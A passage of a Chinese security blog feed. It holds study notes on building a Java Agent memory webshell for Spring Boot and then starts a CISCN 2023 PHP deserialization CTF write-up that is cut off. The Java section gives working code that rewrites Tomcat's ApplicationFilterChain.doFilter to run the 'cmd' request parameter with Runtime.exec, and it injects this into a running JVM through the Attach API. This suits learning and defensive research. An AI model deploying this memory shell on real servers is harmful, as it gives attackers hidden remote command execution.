class="line">Process finished with exit code <span class="number">0</span></span><br></pre></td></tr></table></figure><p>下面我们就来实现一个<code>agentmain-Agent</code>。首先我们编写一个Sleep_Hello类，模拟正在运行的JVM</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Thread.sleep;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Sleep_Hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">            sleep(<span class="number">5000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后编写我们的agentmain-Agent类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.java.agentmain.agent;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Thread.sleep;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Java_Agent_agentmain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation inst)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;调用了agentmain-Agent!&quot;</span>);</span><br><span class="line">            sleep(<span class="number">3000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时修改配置MANIFEST.MF文件</p><p>编译打包成jar文件<code>out/artifacts/Java_Agent_jar/Java_Agent.jar</code></p><p>最后编写一个<code>Inject_Agent</code>类，获取特定JVM的PID并注入Agent</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.java.inject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inject_Agent</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;</span><br><span class="line">        <span class="comment">//调用VirtualMachine.list()获取正在运行的JVM列表</span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;</span><br><span class="line">            System.out.println(vmd.displayName());</span><br><span class="line"></span><br><span class="line">            <span class="comment">//遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent</span></span><br><span class="line">            <span class="keyword">if</span>(vmd.displayName().equals(<span class="string">&quot;com.java.agentmain.agent.Sleep_Hello&quot;</span>))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//连接指定JVM</span></span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(vmd.id());</span><br><span class="line">                <span class="comment">//加载Agent</span></span><br><span class="line">                System.out.println(<span class="string">&quot;&quot;</span>);</span><br><span class="line">                virtualMachine.loadAgent(<span class="string">&quot;out/artifacts/Java_Agent_agentmain_jar/Java_Agent_agentmain.jar&quot;</span>);</span><br><span class="line">                <span class="comment">//断开JVM连接</span></span><br><span class="line">                virtualMachine.detach();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先运行 Sleep_Hello</p><p>再运行Inject_Agent</p><p><img src="../images/image-20230816164805056.png" alt="image-20230816164805056"></p><p>这里的名字必须改成这个   否则会找不到</p><p><img src="../images/image-20230816164641786.png" alt="image-20230816164641786"></p><h4 id="Instrumentation"><a href="#Instrumentation" class="headerlink" title="Instrumentation"></a>Instrumentation</h4><p>Instrumentation是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。</p><p><img src="../images/image-20230816165234074.png" alt="image-20230816165234074"></p><p>其在Java中是一个接口，常用方法如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Instrumentation</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer, <span class="type">boolean</span> canRetransform)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//删除一个类转换器</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">//在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">//判断一个类是否被修改</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 获取目标已经加载的类。</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getAllLoadedClasses();</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//获取一个对象的大小</span></span><br><span class="line">    <span class="type">long</span> <span class="title function_">getObjectSize</span><span class="params">(Object objectToSize)</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="获取目标JVM已加载类"><a href="#获取目标JVM已加载类" class="headerlink" title="获取目标JVM已加载类"></a>获取目标JVM已加载类</h5><p>这里懒得跟了   解释一下就是使用javassist 配合transform来修改正在运行JVM的字节码。 然后配合<code>inject_agent</code>将修改的恶意字节码进行注入</p><p><img src="../images/image-20230816194725502.png" alt="image-20230816194725502"></p><p>这里就是说的是修改前的和修改后的类</p><p><strong>(这篇文章就是在同一个类上进行修改  就满足了上面的所有条件  只是方法体不同而已  就是函数内容不一样)</strong></p><p>想要了解更详细的话 可以去看上面的参考文章  讲的很清楚了  这里是我懒  所以就不继续跟了。。。。。。。。。。。</p><h3 id="Agent内存马"><a href="#Agent内存马" class="headerlink" title="Agent内存马"></a>Agent内存马</h3><p>现在我们可以通过Java Agent技术来修改正在运行JVM中的方法体，那么我们可以Hook一些JVM一定会调用、并且Hook之后不会影响正常业务逻辑的的方法来实现内存马。</p><p>这里我们以Spring Boot为例，来实现一个Agent内存马</p><h4 id="Spring-Boot中的Tomcat"><a href="#Spring-Boot中的Tomcat" class="headerlink" title="Spring Boot中的Tomcat"></a>Spring Boot中的Tomcat</h4><p><a href="https://www.cnblogs.com/xiongzaiqiren/p/12466652.html">简单的搭建springboot进行测试</a></p><p><img src="../images/image-20230817110405818.png" alt="image-20230817110405818"></p><p><strong>这里要注意的是启动器得和controller在一个package下  (默认的情况下)</strong></p><p>接下来是搭建这个SpringMVC</p><p>(因为一个小bug  搭建了3个小时  tmd)</p><p><img src="../images/image-20230817164814383.png" alt="image-20230817164814383"></p><p>成功进行搭建</p><p>开始进行分析了</p><p>我们知道，Spring Boot中内嵌了一个embed Tomcat作为其启动容器。既然是Tomcat，那肯定有相应的组件容器。我们先来调试一下SpringBoot，部分调用栈如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Context:<span class="number">20</span>, Context_Learn (com.example.spring_controller)</span><br><span class="line">...</span><br><span class="line">(org.springframework.web.servlet.mvc.method.annotation)</span><br><span class="line">handleInternal:<span class="number">808</span>, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation)</span><br><span class="line">handle:<span class="number">87</span>, AbstractHandlerMethodAdapter (org.springframework.web.servlet.mvc.method)</span><br><span class="line">doDispatch:<span class="number">1067</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doService:<span class="number">963</span>, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">processRequest:<span class="number">1006</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">doGet:<span class="number">898</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:<span class="number">655</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">service:<span class="number">883</span>, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:<span class="number">764</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">internalDoFilter:<span class="number">227</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">53</span>, WsFilter (org.apache.tomcat.websocket.server)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">100</span>, RequestContextFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">117</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">93</span>, FormContentFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">117</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:<span class="number">201</span>, CharacterEncodingFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">117</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230817165727645.png" alt="image-20230817165727645"></p><p>可以看到会按照责任链机制反复调用<code>ApplicationFilterChain#doFilter()</code>方法</p><p><img src="../images/image-20230817170702087.png" alt="image-20230817170702087"></p><p>跟到internalDoFilter()方法中</p><p><img src="../images/image-20230817170732321.png" alt="image-20230817170732321"></p><p>以上两个方法均拥有ServletRequest和ServletResponse，并且hook不会影响正常的业务逻辑，因此很适合作为内存马的回显。下面我们尝试利用</p><h4 id="利用Java-Agent实现Spring-Filter内存马"><a href="#利用Java-Agent实现Spring-Filter内存马" class="headerlink" title="利用Java Agent实现Spring Filter内存马"></a>利用Java Agent实现Spring Filter内存马</h4><p>我们复用上面的agentmain-Agent，修改字节码的关键在于<code>transformer()</code>方法，因此我们重写该方法即可</p><p><strong>(不用premain的原因是因为一般注入内存马的话  程序已经在运行了  就不能在程序运行前进行注入了)</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.java.agentmain.instrumentation.transformer;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Filter_Transform</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//获取CtClass 对象的容器 ClassPool</span></span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//添加额外的类搜索路径</span></span><br><span class="line">            <span class="keyword">if</span> (classBeingRedefined != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">ClassClassPath</span> <span class="variable">ccp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(classBeingRedefined);</span><br><span class="line">                classPool.insertClassPath(ccp);</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//获取目标类</span></span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//获取目标方法</span></span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;doFilter&quot;</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//设置方法体</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;javax.servlet.http.HttpServletRequest request = $1\n;&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;String cmd=request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;if (cmd !=null)&#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;  Runtime.getRuntime().exec(cmd);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;  &#125;&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">            ctMethod.setBody(body);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//返回目标类字节码</span></span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line"> </span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是构造恶意的字节码</p><p>Inject_Agent_Spring类如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.java.inject;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.*;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inject_Agent_Spring</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;</span><br><span class="line">        <span class="comment">//调用VirtualMachine.list()获取正在运行的JVM列表</span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent</span></span><br><span class="line">            <span class="keyword">if</span>(vmd.displayName().equals(<span class="string">&quot;com.example.java_agent_springboot.JavaAgentSpringBootApplication&quot;</span>))&#123;</span><br><span class="line"> </span><br><span class="line">                <span class="comment">//连接指定JVM</span></span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(vmd.id());</span><br><span class="line">                <span class="comment">//加载Agent</span></span><br><span class="line">                virtualMachine.loadAgent(<span class="string">&quot;out/artifacts/Java_Agent_jar/Java_Agent.jar&quot;</span>);</span><br><span class="line">                <span class="comment">//断开JVM连接</span></span><br><span class="line">                virtualMachine.detach();</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//            System.out.println(vmd.displayName());</span></span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个代码就是将恶意的字节码进行注入  </p><p><img src="../images/image-20230817173014465.png" alt="image-20230817173014465"></p><p><strong>内存马到这就结束了   学习了挺久的这么多内容  (虽然说是学完了  但是会不会还是另说。。。。。。。。。)</strong></p><p>内存马回显技术在新开一篇文章来写</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://goodapple.top/archives/1355&quot;&gt;参考文章&lt;/a&gt;     &lt;a href=&quot;https://github.com/Claradoll/Security_Learning&quot;&gt;题目用到的代码地址&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    
    <category term="java-内存马" scheme="https://ke1nys.github.io/tags/java-%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>Nss-Ciscn2023</title>
    <link href="https://ke1nys.github.io/posts/b7182eee.html"/>
    <id>https://ke1nys.github.io/posts/b7182eee.html</id>
    <published>2023-07-19T11:44:28.000Z</published>
    <updated>2023-07-29T08:13:42.297Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CISCN-2023-华北-ez-date"><a href="#CISCN-2023-华北-ez-date" class="headerlink" title="[CISCN 2023 华北]ez_date"></a>[CISCN 2023 华北]ez_date</h2><p><strong>题目给的代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">date</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;a)||<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;b))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;no array&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;a !== <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;b)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;a)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;b)) )&#123;</span><br><span class="line">            <span class="variable">$content</span>=<span class="title function_ invoke__">date</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="variable">$uuid</span>=<span class="title function_ invoke__">uniqid</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$uuid</span>,<span class="variable">$content</span>);</span><br><span class="line">            <span class="variable">$data</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uuid</span>));</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]));</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230719200322956.png" alt="image-20230719200322956"></p><p>这里的话不给使用数组进行绕过  经过本地测试</p><p><img src="../images/image-20230719200414990.png" alt="image-20230719200414990"></p><p>可以使用<strong>数字型</strong>和<strong>字符型</strong>进行绕过</p><p><img src="../images/image-20230719201900384.png" alt="image-20230719201900384"></p><p>剩下的关键点就是这个如何绕过这个<code>date</code>函数了</p><p>因为这个正则匹配的话是没过滤字母啥的   所以只要不使用奇奇怪怪的东西就不会被正则到</p><p><img src="../images/image-20230719202055816.png" alt="image-20230719202055816"></p><p><img src="../images/image-20230719202109278.png" alt="image-20230719202109278"></p><p>将字母转义后  就可以输出正常的字母了</p><p>最后的<strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">date</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    